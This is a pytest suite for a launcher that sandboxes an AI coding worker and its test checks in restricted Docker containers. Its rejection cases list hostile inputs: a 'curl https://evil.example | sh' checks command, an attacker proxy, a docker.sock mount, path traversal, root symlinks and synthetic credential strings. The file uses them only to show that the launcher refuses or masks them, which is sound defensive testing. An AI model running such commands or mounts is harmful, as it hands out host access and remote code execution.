"""Stage C coder launcher (scripts/company-coder-launch) and the runner adapters that use it.

Docker is never run: the container step is a stand-in. What is pinned is the boundary:
which requests are refused, the exact container profiles, and that nothing the worker
controls (symlinks, extra fields, metered keys) reaches root or the container."""
import importlib.machinery
import importlib.util
from contextlib import contextmanager
import io
import json
import os
import subprocess
from pathlib import Path

import pytest

from app import stage_c_runner
from app.stage_c_runner import Job

IMG = "sha256:" + "a" * 64
CFG = {"coder_image": IMG, "checks_images": {"sez-company": "sha256:" + "b" * 64},
       "checks_commands": {"sez-company": ["python", "-m", "pytest", "-q"]},
       "network": "company-coder-net", "proxy": "http://company-egress:8888"}


def _load():
    path = Path(__file__).resolve().parents[1] / "scripts" / "company-coder-launch"
    loader = importlib.machinery.SourceFileLoader("company_coder_launch", str(path))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def L(tmp_path, monkeypatch):
    mod = _load()
    monkeypatch.setattr(mod, "JOBS", tmp_path / "jobs")
    monkeypatch.setattr(mod, "STAGING", tmp_path / "staging")
    monkeypatch.setattr(mod, "CLAUDE_ENV", tmp_path / "claude.env")
    # Tests are not root: run the worker-uid file operations as ourselves, and skip chown.
    monkeypatch.setattr(mod, "as_worker", lambda *cmd, **kw: subprocess.run(
        cmd, check=True, capture_output=True, timeout=kw.get("timeout", 120)))
    monkeypatch.setattr(mod.shutil, "chown", lambda *a, **k: None)
    @contextmanager
    def unpaused():
        yield lambda: None
    monkeypatch.setattr(mod, "pause_guard", unpaused)
    (tmp_path / "jobs").mkdir()
    (tmp_path / "staging").mkdir()
    (tmp_path / "claude.env").write_text("CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat-test\n")
    return mod


@pytest.mark.parametrize("req", [
    {"kind": "shell", "provider": "claude", "timeout_s": 10},
    {"kind": "code", "provider": "gpt", "timeout_s": 10},
    {"kind": "code", "provider": "claude", "timeout_s": 99999},
    {"kind": "code", "provider": "claude", "timeout_s": True},
    {"kind": "code", "provider": "claude", "timeout_s": 10, "image": "evil"},
    {"kind": "checks", "repo": "other", "timeout_s": 10},
])
def test_a_request_outside_the_two_profiles_is_refused(L, req):
    # Break caught: a request widens the container (unknown kind, field, provider or a long run).
    with pytest.raises(L.Refused):
        L.parse_request(json.dumps(req).encode(), CFG)


def test_the_code_profile_is_fixed_and_offline_except_the_proxy(L, tmp_path):
    provider = "claude"
    argv = L.docker_argv({"kind": "code", "provider": provider, "timeout_s": 10}, CFG, tmp_path / "ws", "n")
    joined = " ".join(argv)
    # Break caught: a privilege, a host path or a control credential reaches the coder.
    for flag in ("--read-only", "--cap-drop=ALL", "--security-opt=no-new-privileges:true",
                 "--network=company-coder-net", "--pull=never", "--user=10001:10001", "--env=NO_PROXY="):
        assert flag in argv
    assert "--privileged" not in joined and "docker.sock" not in joined and "--dangerously" not in joined
    assert [a for a in argv if a.startswith("type=bind")] == [
        f"type=bind,source={tmp_path / 'ws'},target=/workspace",
        f"type=bind,source={tmp_path / 'ack'},target=/run/company-coder"]
    assert argv[argv.index("sh") + 1:argv.index("sh") + 5] == [
        "-c", ('touch /run/company-coder/started; n=0; '
               'while [ ! -f /run/company-coder/allowed ]; do n=$((n+1)); '
               '[ "$n" -lt 600 ] || exit 124; sleep 0.05; done; exec "$@"'), "company-coder", provider]
    assert IMG in argv
    assert "Bash" not in argv[argv.index("--tools") + 1] and "company-coder-codex" not in joined


def test_codex_is_reviewer_only_and_refused_by_the_stage_c_launcher(L, tmp_path):
    request = {"kind": "code", "provider": "codex", "timeout_s": 10}
    with pytest.raises(L.Refused):
        L.parse_request(json.dumps(request).encode(), CFG)
    with pytest.raises(L.Refused):
        L.docker_argv(request, CFG, tmp_path / "ws", "n")


def test_checks_run_without_network_or_credentials(L, tmp_path):
    argv = L.docker_argv({"kind": "checks", "repo": "sez-company", "timeout_s": 10}, CFG, tmp_path / "c", "n")
    joined = " ".join(argv)
    assert "--network=none" in argv and "PROXY" not in joined and "env-file" not in joined
    assert argv[-4:] == ["python", "-m", "pytest", "-q"]
    # Per-test evidence comes from an env var, so the pinned checks command (and the host config) stay unchanged.
    assert "--env=PYTEST_ADDOPTS=-rfEp" in argv


@pytest.mark.parametrize("kind", ["code", "checks"])
def test_every_profile_runs_an_init_that_reaps_orphans(L, tmp_path, kind):
    """L2 pilot TASK-0070 (2026-10-19): pytest ran as PID 1 in the checks container and never reaped orphaned git
    and sh children. 254 zombies filled --pids-limit=256, the kernel refused 327 forks, and 70 tests failed plus 84
    errored before the 600 s timeout. An init as PID 1 reaps them; the pids limit itself stays."""
    req = {"kind": kind, "provider": "claude", "timeout_s": 10} if kind == "code" else \
        {"kind": "checks", "repo": "sez-company", "timeout_s": 10}
    argv = L.docker_argv(req, CFG, tmp_path / "w", "n")
    assert "--init" in argv and argv.index("--init") < argv.index("--mount")
    assert "--pids-limit=256" in argv


def test_checks_temp_dir_is_the_writable_workspace_not_the_noexec_tmpfs(L, tmp_path):
    """Live pilot attempt 2026-10-07: 14 tests that write helper scripts under pytest's temp dir and
    execute them failed (`Permission denied`, exit 126) because /tmp is Docker's noexec tmpfs. Moving
    TMPDIR to the writable bind mount made the full suite pass offline (673 passed) without adding
    exec to the tmpfs or any privilege. The checks copy is never imported back, so nothing leaks."""
    argv = L.docker_argv({"kind": "checks", "repo": "sez-company", "timeout_s": 10}, CFG, tmp_path / "c", "n")
    assert "--env=TMPDIR=/workspace" in argv
    assert "--tmpfs=/tmp:size=256m,mode=1777" in argv                    # still no exec on /tmp
    assert [a for a in argv if a.startswith("--security-opt")] == ["--security-opt=no-new-privileges:true"]
    assert "--cap-add" not in " ".join(argv) and "--read-only" in argv


@pytest.mark.parametrize("content", ["ANTHROPIC_API_KEY=sk-ant-api\n",
                                     "CLAUDE_CODE_OAUTH_TOKEN=x\nOPENAI_API_KEY=y\n", ""])
def test_the_claude_env_file_holds_only_the_subscription_token(L, content):
    L.CLAUDE_ENV.write_text(content)
    # Break caught: a metered key or an extra variable rides into the coder (§26A).
    with pytest.raises(L.Refused):
        L.claude_env_file()


def test_root_never_follows_a_symlink_the_worker_planted(L, tmp_path):
    (tmp_path / "secret").write_text("root only")
    (tmp_path / "link").symlink_to(tmp_path / "secret")
    with pytest.raises(OSError):
        L.read_regular(tmp_path / "link", 100)


def test_root_launch_lock_never_follows_worker_symlinks(L, tmp_path):
    task_dir = L.JOBS / "TASK-0101"
    target_dir = tmp_path / "target"
    target_dir.mkdir()
    task_dir.symlink_to(target_dir, target_is_directory=True)
    with pytest.raises(OSError):
        L.launch_lock(task_dir)

    task_dir.unlink()
    task_dir.mkdir()
    target_file = tmp_path / "lock-target"
    target_file.write_text("untouched")
    (task_dir / "launch.lock").symlink_to(target_file)
    with pytest.raises(OSError):
        L.launch_lock(task_dir)
    assert target_file.read_text() == "untouched"


def _job(L, key="TASK-0101", kind="code", workspace=True):
    job = L.JOBS / key
    (job / "workspace" / "app").mkdir(parents=True)
    (job / "workspace" / "app" / "calc.py").write_text("return a - b\n")
    (job / "prompt.txt").write_text("fix add")
    (job / "request.json").write_text(json.dumps({"kind": kind, "provider": "claude", "timeout_s": 10}))
    return job


def test_a_symlinked_workspace_is_refused_not_mounted(L, tmp_path):
    job = _job(L)
    import shutil
    shutil.rmtree(job / "workspace")
    (job / "workspace").symlink_to("/")
    seen = []
    res = L.handle("TASK-0101", CFG, runner=lambda *a: seen.append(a))
    # Break caught: the worker points the bind mount at the host root.
    assert "refused" in res and seen == []
    assert json.loads((job / "done" / "result.json").read_text())["refused"]


def test_staging_dir_belongs_to_the_worker_before_anything_is_copied_into_it(L, monkeypatch):
    """Live failure 2026-10-07: mkdtemp makes a root-only 0700 directory, and the first `cp` ran as
    uid 10001 into it, so every real request died with CalledProcessError and no result.json."""
    owned, copied = set(), []
    monkeypatch.setattr(L.shutil, "chown", lambda path, *a, **k: owned.add(Path(path)))

    def as_worker(*cmd, **kw):
        if cmd[0] == "cp":
            dest = Path(cmd[-1])
            copied.append(dest)
            if str(dest).startswith(str(L.STAGING)):
                assert dest.parent in owned, f"worker uid cannot write into root-only {dest.parent}"
        return subprocess.run(cmd, check=True, capture_output=True, timeout=kw.get("timeout", 120))

    monkeypatch.setattr(L, "as_worker", as_worker)
    job = _job(L)
    res = L.handle("TASK-0101", CFG, runner=lambda *a: {"exit": 0, "timed_out": False, "summary": "ok"})
    assert "refused" not in res
    assert any(p.name == "request.json" for p in copied)
    assert json.loads((job / "done" / "result.json").read_text())["exit"] == 0


def test_an_invalid_key_never_touches_the_filesystem(L):
    with pytest.raises(L.Refused):
        L.handle("../../etc", CFG)


def test_coder_adapter_round_trip_through_the_launcher(L, tmp_path):
    """The worker side and the host side together: request → one container → edited workspace."""
    job_dir = L.JOBS / "TASK-0101"
    (job_dir / "workspace" / "app").mkdir(parents=True)
    (job_dir / "workspace" / "app" / "calc.py").write_text("def add(a, b):\n    return a - b\n")
    calls = []
    enqueue = []

    def container(argv, prompt, timeout_s, name):
        calls.append((argv, prompt))
        ws = Path(argv[argv.index("--mount") + 1].split(",")[1].split("=", 1)[1])
        (ws / "app" / "calc.py").write_text("def add(a, b):\n    return a + b\n")
        return {"exit": 0, "timed_out": False, "summary": "done"}

    def after_start(started):
        assert started is True
        assert (job_dir / "done" / "started.json").is_file()
        enqueue.append("started")
    coder = stage_c_runner.launcher_coder(timeout_s=60, poll_s=0,
                                          sleep=lambda _: L.handle("TASK-0101", CFG, runner=container),
                                          before_enqueue=lambda: enqueue.append("locked"),
                                          after_start=after_start)
    job = Job(task_key="TASK-0101", repository="r", mirror=tmp_path, base="0" * 40, paths=["app/calc.py"],
              objective="fix add", success_criteria="add(2, 2) == 4", provider="claude")
    coder(job_dir / "workspace", job)
    assert (job_dir / "workspace" / "app" / "calc.py").read_text().endswith("a + b\n")
    assert len(calls) == 1 and b"fix add" in calls[0][1] and b"app/calc.py" in calls[0][1]
    assert enqueue == ["locked", "started"]
    assert not (job_dir / "request.json").exists()  # claimed: the path unit does not loop


def test_a_cancelled_request_is_refused_before_the_container_runner(L, tmp_path):
    job = _job(L)
    (job / "cancel.json").write_text("cancelled")
    called = []

    result = L.handle("TASK-0101", CFG, runner=lambda *args: called.append(args))

    assert called == []
    assert "cancelled before coder start" in result["refused"]
    assert json.loads((job / "done" / "result.json").read_text())["refused"]


class FakeProcess:
    """Popen stand-in for run_container: in-memory pipes; `read` runs on the first stdout read (the container)."""
    returncode = 0

    def __init__(self, out=b"", read=None):
        outer = self

        class Out(io.BytesIO):
            def read1(self, size=-1):
                if outer.read:
                    outer.read, hook = None, outer.read
                    hook()
                return super().read1(size)
        self.args, self.read = ["docker"], read
        self.stdin, self.stdout, self.stderr = io.BytesIO(), Out(out), io.BytesIO()

    def wait(self, timeout=None):
        return self.returncode


def test_container_start_is_acknowledged_from_inside_the_coder_container(L, monkeypatch, tmp_path):
    import threading
    events = []
    started = threading.Event()
    started_file = tmp_path / "ack" / "started"
    started_file.parent.mkdir()

    def spawn(*args, **kwargs):
        events.append("spawned")
        started_file.touch()
        return FakeProcess(b"done", read=lambda: (started.wait(2), events.append("finished")))

    monkeypatch.setattr(L.subprocess, "Popen", spawn)
    result = L.run_container(["docker"], b"prompt", 1, "coder",
                             on_started=lambda: (events.append("started"), started.set()),
                             started_file=started_file)

    assert result["exit"] == 0
    assert events == ["spawned", "started", "finished"]


def test_container_exit_before_the_start_ack_never_releases_the_owner_lock(L, monkeypatch, tmp_path):
    events = []
    class Process(FakeProcess):
        returncode = 1

    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: Process())
    result = L.run_container(["docker"], b"prompt", 1, "coder", on_started=lambda: events.append("started"),
                             started_file=tmp_path / "missing-ack")

    assert result["exit"] == 1 and events == []


def test_root_launch_lock_acquisition_is_bounded(L):
    job = L.JOBS / "TASK-0101"
    job.mkdir()
    lock = job / "launch.lock"
    lock.touch()
    fd = os.open(lock, os.O_RDWR)
    try:
        import fcntl
        fcntl.flock(fd, fcntl.LOCK_EX)
        with pytest.raises(TimeoutError, match="remained busy"):
            L.launch_lock(job, timeout_s=0)
    finally:
        os.close(fd)


def test_worker_launch_lock_acquisition_is_bounded(tmp_path):
    import fcntl
    job = tmp_path / "TASK-0101"
    job.mkdir()
    lock = job / "launch.lock"
    lock.touch()
    fd = os.open(lock, os.O_RDWR)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        with pytest.raises(TimeoutError, match="remained busy"):
            stage_c_runner._launch_lock(job, timeout_s=0)
    finally:
        os.close(fd)


def test_unknown_cancel_lock_keeps_the_enqueued_attempt_and_does_not_claim_no_start(tmp_path, monkeypatch):
    job = tmp_path / "TASK-0101"
    job.mkdir()
    calls, released = 0, []

    def launch_lock(path, timeout_s):
        nonlocal calls
        calls += 1
        if calls == 1:
            return os.open(path / "launch.lock", os.O_CREAT | os.O_RDWR, 0o600)
        assert timeout_s == stage_c_runner.LAUNCH_LOCK_TIMEOUT
        raise TimeoutError("host still owns launch lock")

    monkeypatch.setattr(stage_c_runner, "_launch_lock", launch_lock)
    clock = iter((0, 0, 61))
    monkeypatch.setattr(stage_c_runner.time, "monotonic", lambda: next(clock))
    with pytest.raises(stage_c_runner.CoderStartStateUnknown):
        stage_c_runner._launch(job, {"kind": "code"}, 100, 0, lambda _: None,
                               before_enqueue=lambda: None,
                               after_start=lambda started: released.append(started))

    assert released == []
    assert (job / "request.json").is_file()
    assert not (job / "cancel.json").exists()


def test_unclaimed_launch_timeout_cancels_before_releasing_the_task_lock(tmp_path, monkeypatch):
    job = tmp_path / "TASK-0101"
    job.mkdir()
    clock = iter((0, 0, 0, 61, 61))
    events = []
    monkeypatch.setattr(stage_c_runner.time, "monotonic", lambda: next(clock))

    def released(started):
        assert started is False
        assert (job / "cancel.json").is_file()
        assert not (job / "request.json").exists()
        events.append("released")

    with pytest.raises(TimeoutError, match="did not start"):
        stage_c_runner._launch(job, {"kind": "code"}, 100, 0, lambda _: None,
                               before_enqueue=lambda: events.append("locked"), after_start=released)

    assert events == ["locked", "released"]
    assert not job.exists()  # no queued request remains that could start after a takeover


def test_a_failed_or_timed_out_coder_is_a_failure(L, tmp_path):
    job_dir = L.JOBS / "TASK-0101"
    (job_dir / "workspace").mkdir(parents=True)
    coder = stage_c_runner.launcher_coder(timeout_s=60, poll_s=0, sleep=lambda _: L.handle(
        "TASK-0101", CFG, runner=lambda *a: {"exit": None, "timed_out": True, "summary": "timed out"}))
    job = Job(task_key="TASK-0101", repository="r", mirror=tmp_path, base="0" * 40, paths=["a.py"],
              objective="o", success_criteria="c", provider="claude")
    with pytest.raises(RuntimeError):
        coder(job_dir / "workspace", job)


def test_checks_pass_only_on_exit_zero(L):
    job_dir = L.JOBS / "TASK-0101"
    (job_dir / "checks").mkdir(parents=True)
    for exit_code, passed in ((0, True), (1, False), (None, False)):
        checks = stage_c_runner.launcher_checks("sez-company", timeout_s=60, poll_s=0, sleep=lambda _: L.handle(
            "TASK-0101", CFG, runner=lambda *a: {"exit": exit_code, "timed_out": False, "summary": "1 passed"}))
        assert checks(job_dir / "checks")["passed"] is passed


@pytest.mark.parametrize("summary, passed", [
    ("", False), ("done", False), ("no tests ran in 0.01s", False), ("0 passed", False),
    ("1 failed, 3 passed in 0.2s", False), ("3 passed, 1 error in 0.2s", False), ("2 errors in 0.1s", False),
    ("12 passed in 3.1s", True), ("========= 12 passed, 2 skipped, 1 warning in 3.10s =========", True),
])
def test_exit_zero_passes_only_with_a_pytest_result(L, summary, passed):
    """An import-time os._exit(0) ends pytest with exit 0 before any test ran: exit 0 alone is not a result."""
    job_dir = L.JOBS / "TASK-0101"
    (job_dir / "checks").mkdir(parents=True)
    checks = stage_c_runner.launcher_checks("sez-company", timeout_s=60, poll_s=0, sleep=lambda _: L.handle(
        "TASK-0101", CFG, runner=lambda *a: {"exit": 0, "timed_out": False, "summary": summary}))
    result = checks(job_dir / "checks")
    assert result["passed"] is passed
    if not passed:
        assert result["summary"] in (summary, "checks did not report a pytest result")


def test_a_flood_of_output_keeps_only_the_tail_and_the_real_summary(L, monkeypatch):
    """A test printing forever cannot exhaust root's memory: stdout is drained in chunks into a capped tail."""
    monkeypatch.setattr(L, "MAX_STDOUT", 4096)
    flood = b"".join(b"noise %d\n" % i for i in range(20_000))
    summary = (b"\nFAILED tests/test_a.py::test_one - assert 0\nPASSED tests/test_b.py::test_two\n"
               b"1 failed, 1 passed in 0.1s\n")
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(flood + summary))
    seen = []
    real = L.bounded_communicate
    monkeypatch.setattr(L, "bounded_communicate", lambda *a: seen.append(real(*a)) or seen[-1])
    result = L.run_container(["docker"], b"", 5, "checks")
    assert len(seen[0][0]) == 4096 and seen[0][0].endswith(summary)
    # The dropped head was never scanned: nothing of an overflowing run is returned, and the checks fail closed.
    assert result["summary"] == L.OVERFLOWED and result["failures"] == [L.OVERFLOWED]
    assert result["passed_files"] == []


PYTEST_OUTPUT = """.....F..
=================================== FAILURES ===================================
_____ test_check_activation_accepts_non_active_goal_without_selector _____
    def test_check_activation_accepts_non_active_goal_without_selector():
>       goals.check_activation(db, goal)
E       TypeError: check_activation() takes 1 positional argument but 2 were given
tests/test_goals.py:157: TypeError
=========================== short test summary info ============================
FAILED tests/test_goals.py::test_check_activation_accepts_non_active_goal_without_selector
1 failed, 39 passed in 2.74s
"""


def test_failure_lines_keep_pytests_own_failure_lines_bounded(L):
    assert L.failure_lines(PYTEST_OUTPUT) == [
        "FAILED tests/test_goals.py::test_check_activation_accepts_non_active_goal_without_selector",
        "E       TypeError: check_activation() takes 1 positional argument but 2 were given",
        "tests/test_goals.py:157: TypeError"]
    flood = "\n".join("E   " + "x" * 1000 for _ in range(100))
    lines = L.failure_lines(flood)
    assert len(lines) == L.MAX_FAILURE_LINES and all(len(l) == L.MAX_FAILURE_CHARS for l in lines)
    # Long tracebacks never crowd out the node ids that come last in pytest's output.
    noisy = flood + "\nFAILED tests/test_a.py::test_one\nFAILED tests/test_a.py::test_two\n"
    assert L.failure_lines(noisy)[:2] == ["FAILED tests/test_a.py::test_one", "FAILED tests/test_a.py::test_two"]
    assert L.failure_lines("3 passed in 0.1s") == []


def test_checks_return_their_failure_lines_and_a_code_job_never_does(L):
    """A repair attempt needs to know which test failed and why; a code job's stdout is model output and stays out."""
    job_dir = L.JOBS / "TASK-0101"
    (job_dir / "checks").mkdir(parents=True)
    failures = ["FAILED tests/test_goals.py::test_x - TypeError: boom"]
    checks = stage_c_runner.launcher_checks("sez-company", timeout_s=60, poll_s=0, sleep=lambda _: L.handle(
        "TASK-0101", CFG, runner=lambda *a: {"exit": 1, "timed_out": False, "summary": "1 failed",
                                             "failures": failures}))
    result = checks(job_dir / "checks")
    assert result["passed"] is False and result["failures"] == failures
    job = _job(L, key="TASK-0102")
    L.handle("TASK-0102", CFG, runner=lambda *a: {"exit": 0, "timed_out": False, "summary": "done",
                                                  "failures": ["FAILED made up by the model"],
                                                  "passed_files": ["tests/made_up.py"]})
    result = json.loads((job / "done" / "result.json").read_text())
    assert "failures" not in result and "passed_files" not in result


def test_no_launcher_result_is_not_success(tmp_path, monkeypatch):
    (tmp_path / "TASK-0101" / "checks").mkdir(parents=True)
    clock = iter([0, 0, 10_000])
    monkeypatch.setattr(stage_c_runner.time, "monotonic", lambda: next(clock))
    checks = stage_c_runner.launcher_checks("sez-company", timeout_s=1, poll_s=0, sleep=lambda _: None)
    assert checks(tmp_path / "TASK-0101" / "checks")["passed"] is False


def _takeover_before_enqueue():
    raise stage_c_runner.CoderLaunchRefused("task_changed")


def test_a_takeover_before_enqueue_leaves_no_request_in_the_real_launch_path(tmp_path):
    job = tmp_path / "TASK-0102"
    job.mkdir()
    started = []
    with pytest.raises(stage_c_runner.CoderLaunchRefused):
        stage_c_runner._launch(job, {"kind": "code", "provider": "claude", "timeout_s": 1}, 100, 0,
                               lambda _: None, before_enqueue=_takeover_before_enqueue,
                               after_start=lambda s: started.append(s))
    # Zero runnable requests: no request, no temp request, no claim, no cancel marker, no start.
    assert not any(job.glob("request*.json*"))
    assert not (job / "done").exists()
    assert started == []


def test_the_real_coder_wrapper_refuses_before_writing_any_request(tmp_path):
    job = tmp_path / "TASK-0103"
    workspace = job / "workspace"
    workspace.mkdir(parents=True)
    job_spec = stage_c_runner.Job("TASK-0103", "seerxo/os", tmp_path / "mirror", "a" * 40,
                                  ["app/goals.py"], "objective", "criteria", "claude")
    coder = stage_c_runner.launcher_coder(sleep=lambda _: None, before_enqueue=_takeover_before_enqueue,
                                          after_start=lambda s: None)
    with pytest.raises(stage_c_runner.CoderLaunchRefused):
        coder(workspace, job_spec)
    # The prompt may be written by the wrapper; no coding request may exist for a refused attempt.
    assert not any(job.glob("request*.json*"))
    assert not (job / "done").exists()


def test_checks_container_signals_its_start_through_the_ack_mount(L, tmp_path):
    """Live failure 2026-10-13: the launcher waited for ack/started, but a checks container had no ack
    mount or start marker, so every checks run was killed as 'did not start'. Checks now get the same
    acknowledgement as the coder, and their command is still the last argument."""
    argv = L.docker_argv({"kind": "checks", "repo": "sez-company", "timeout_s": 10}, CFG, tmp_path / "c", "n")
    assert "target=/run/company-coder" in " ".join(argv)
    assert ('touch /run/company-coder/started; n=0; '
            'while [ ! -f /run/company-coder/allowed ]; do n=$((n+1)); '
            '[ "$n" -lt 600 ] || exit 124; sleep 0.05; done; exec "$@"') in argv
    assert argv[-4:] == ["python", "-m", "pytest", "-q"]
    assert argv.index("sh") > argv.index(CFG["checks_images"]["sez-company"])


def test_long_running_checks_are_not_misclassified_as_an_unstarted_container(L, monkeypatch, tmp_path):
    """Regression: checks that run longer than START_TIMEOUT used to be killed as 'did not start', because
    no start marker was ever written for them. The checks wrapper touches the marker at start, so a
    running checks container is only ever judged by its own run time. START_TIMEOUT is shortened here so
    the test is controlled; the production value is unchanged."""
    import threading
    monkeypatch.setattr(L, "START_TIMEOUT", 0.2)
    started_file = tmp_path / "ack" / "started"
    started_file.parent.mkdir()
    finished = threading.Event()

    def spawn(*args, **kwargs):
        started_file.touch()  # the wrapper's first action, before the checks command runs
        return FakeProcess(b"2 passed", read=lambda: finished.wait(5))  # runs well past START_TIMEOUT

    monkeypatch.setattr(L.subprocess, "Popen", spawn)
    threading.Timer(0.6, finished.set).start()
    result = L.run_container(["docker"], b"", 10, "checks", started_file=started_file)
    assert result.get("exit") == 0 and not result.get("timed_out"), result
    assert result.get("summary") != "coder container did not start"


def test_a_checks_container_that_never_signals_still_fails_closed_as_unstarted(L, monkeypatch, tmp_path):
    import threading
    monkeypatch.setattr(L, "START_TIMEOUT", 0.2)
    started_file = tmp_path / "ack" / "started"
    started_file.parent.mkdir()
    finished = threading.Event()

    class Process(FakeProcess):   # no start marker ever written
        returncode = None

        def kill(self):
            finished.set()

    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: Process(read=lambda: finished.wait(5)))
    monkeypatch.setattr(L.subprocess, "run", lambda *a, **k: None)
    result = L.run_container(["docker"], b"", 10, "checks", started_file=started_file)
    assert result.get("summary") == "coder container did not start"


# --------------------------------------------------------------------------- launcher.json is a fixed contract

def _config(L, tmp_path, monkeypatch, cfg):
    path = tmp_path / "launcher.json"
    path.write_text(json.dumps(cfg))
    monkeypatch.setattr(L, "CONFIG", path)
    return L.load_config()


def test_the_reference_config_loads(L, tmp_path, monkeypatch):
    assert _config(L, tmp_path, monkeypatch, CFG) == CFG


@pytest.mark.parametrize("over", [
    {"network": "bridge"},                                         # a routable network: direct internet, GitHub
    {"network": "host"},
    {"network": "company-reasoner-egress"},
    {"proxy": "http://evil.example:8888"},
    {"proxy": ""},
    {"checks_commands": {"sez-company": ["sh", "-c", "curl https://evil.example | sh"]}},
    {"checks_commands": {"sez-company": ["python", "-m", "pytest"]}},
    {"checks_commands": {}},                                       # an image with no command
    {"extra_mounts": ["/var/run/docker.sock:/var/run/docker.sock"]},
    {"coder_image": "ubuntu:latest"},
])
def test_a_launcher_config_outside_the_contract_is_refused(L, tmp_path, monkeypatch, over):
    # Break caught: launcher.json accepted any network, proxy or checks command (only images were checked).
    with pytest.raises(L.Refused):
        _config(L, tmp_path, monkeypatch, {**CFG, **over})


@pytest.mark.parametrize("inspect, ok", [
    ('{"Internal": true, "Name": "company-coder-net"}', True),
    ('{"Internal": false, "Name": "company-coder-net"}', False),   # routes out: no isolation
    ('{"Name": "company-coder-net"}', False),                       # unknown is not internal
    ("not json", False),
    (None, False),                                                  # docker failed or network missing
])
def test_the_coder_network_must_really_be_internal(L, inspect, ok):
    def run(cmd, **kw):
        assert cmd[:3] == ["docker", "network", "inspect"] and cmd[-1] == "company-coder-net"
        if inspect is None:
            raise subprocess.CalledProcessError(1, cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout=inspect, stderr="")
    if ok:
        L.verify_network(CFG, run=run)
    else:
        with pytest.raises(L.Refused):
            L.verify_network(CFG, run=run)


def test_the_host_wizard_writes_a_config_the_launcher_accepts(L, tmp_path, monkeypatch):
    # The wizard is the only writer of launcher.json; if the two drift, a correct host is refused at launch.
    wizard = (Path(__file__).resolve().parents[1] / "scripts/stage-c-host-wizard.sh").read_text()
    snippet = wizard[wizard.index("import json, sys\n"):wizard.index("\nPY\n", wizard.index("import json, sys\n"))]
    out = subprocess.run(["python3", "-c", snippet, "sha256:" + "c" * 64, "sha256:" + "d" * 64],
                         capture_output=True, text=True, check=True).stdout
    assert _config(L, tmp_path, monkeypatch, json.loads(out))["network"] == L.CODER_NETWORK


def test_checks_budget_fits_the_full_suite_and_the_stage_c_stale_window():
    # TASK-0070 (L2 pilot, 2026-10-19): the complete offline suite timed out at 600 s. Measured on the host with the
    # exact checks profile and --init: 493 s at --cpus=1. The ceiling keeps ~2.4x headroom, the worker asks for exactly
    # that ceiling, and code + checks + review stays inside the 1 h window after which recover_stale treats a Stage C
    # run as lost.
    import inspect
    mod = _load()
    checks = mod.LIMITS["checks"]
    default = inspect.signature(stage_c_runner.launcher_checks).parameters["timeout_s"].default
    coder = inspect.signature(stage_c_runner.launcher_coder).parameters["timeout_s"].default
    assert checks >= 2 * 493 and default == checks
    assert mod.LIMITS["code"] + checks + 600 < 3600 and coder <= mod.LIMITS["code"]


def test_a_jwt_wrapped_past_the_line_clip_withholds_summary_and_failures(L, monkeypatch):
    """Break caught: failure lines were clipped to 300 chars before any check, so a JWT header beyond the clip was
    dropped while the next `E` line kept its payload and signature."""
    import base64
    b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
    head, rest = b64({"alg": "HS256"}), b64({"sub": "synthetic"}) + ".c2ln"
    out = (b"FAILED tests/test_a.py::test_one - AssertionError\nE   AssertionError: " + b"x" * 400 + b" "
           + head.encode() + b".\nE   " + rest.encode() + b"\n1 failed in 0.1s\n")
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert result["summary"] == "1 failed in 0.1s" and result["failures"] == [L.WITHHELD]   # pytest's own line stays
    assert rest not in json.dumps(result) and head not in json.dumps(result)
    assert not L.has_jose_header("FAILED tests/test_a.py::test_one - assert os.path.join('a', 'b') == 1")


def test_a_private_key_in_check_output_withholds_summary_and_failures(L, monkeypatch):
    mark = b"PRIVATE" + b" KEY-----"   # built, so no key-shaped literal sits in the public repo
    out = (b"FAILED tests/test_a.py::test_one - ValueError\nE   -----BEGIN " + mark + b"\nE   " + b"A" * 64
           + b"\nE   -----END " + mark + b"\n1 failed in 0.1s\n")
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert result["summary"] == "1 failed in 0.1s" and result["failures"] == [L.WITHHELD]   # pytest's own line stays


def test_launcher_and_runner_share_one_credential_pattern(L):
    assert (L.CREDENTIAL_SHAPES, L.KV_BASE, L.ENV_ASSIGN) == (stage_c_runner._CREDENTIAL_SHAPES, stage_c_runner._KV_BASE,
                                                          stage_c_runner._ENV_ASSIGN)


def test_passed_files_never_carry_a_credential_or_withheld_output(L, monkeypatch):
    pat = "ghp_" + "A1b2C3" * 6
    out = b"PASSED tests/" + pat.encode() + b".py::test_one\nPASSED tests/test_b.py::test_two\n2 passed in 0.1s\n"
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert pat not in json.dumps(result) and result["passed_files"] == ["tests/test_b.py"]


def test_recognised_credentials_are_masked_before_the_result_is_written(L, monkeypatch):
    pat = "github_pat_" + "A1b2C3" * 6
    out = (b"FAILED tests/test_a.py::test_one - AssertionError: " + pat.encode() + b"\nE   assert '" + pat.encode()
           + b"' == ''\n1 failed in 0.1s\n")
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert pat not in json.dumps(result) and result["failures"]


def test_exactly_the_stdout_bound_is_whole_and_a_public_header_does_not_withhold(L, monkeypatch):
    import base64
    monkeypatch.setattr(L, "MAX_STDOUT", 4096)
    header = base64.urlsafe_b64encode(b'{"alg":"RS256"}').decode().rstrip("=")
    tail = ("log " + header + ". done\nPASSED tests/test_b.py::test_two\n1 passed in 0.1s\n").encode()
    out = b"x" * (4096 - len(tail) - 1) + b"\n" + tail
    assert len(out) == 4096
    monkeypatch.setattr(L.subprocess, "Popen", lambda *a, **k: FakeProcess(out))
    result = L.run_container(["docker"], b"", 5, "checks")
    assert result["summary"] == "1 passed in 0.1s" and result["passed_files"] == ["tests/test_b.py"]


